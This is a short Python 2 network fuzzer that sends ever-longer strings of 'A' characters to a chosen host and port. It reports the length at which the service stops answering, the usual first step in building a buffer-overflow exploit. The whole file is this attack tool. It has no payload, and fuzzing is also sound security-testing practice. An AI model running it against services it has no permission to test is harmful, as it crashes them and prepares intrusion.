#!/usr/bin/python
import socket,sys,os

TIMEOUT = 15.0
INCREMENT = 20
ITERATIONS = 30

host = str(raw_input("Host: "))
port = int(raw_input("Port: "))

prefix = ''
suffix = '\nexit\r\n'

print "******************************"
print "Verify the prefix and suffix"
print "[+]Prefix: " + prefix
print "[+]Suffix: " + suffix
print "******************************"

bytesToOverflow = 0	#Saves how many bytes crashed the service
buffer=["A"]
counter=10
while len(buffer) <= ITERATIONS:
	buffer.append("A"*counter)
	counter=counter+INCREMENT
for string in buffer:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(TIMEOUT)
		try:			#See if the server has crashed yet
			connect=s.connect((host,port))
			s.recv(1024)
			s.close()
		except:			#If it has crashed, we found our buffer length
			if bytesToOverflow == 0:
				print "\n(!) Could not connect to the service\n"
				exit()
			print "(*) Service crashed at " + str(bytesToOverflow) + " bytes"
			break
		print "[+] Fuzzing parameter with %s bytes" % len(string)
		s.send(str(prefix) + string + str(suffix))
		s.close()
		bytesToOverflow = len(string)
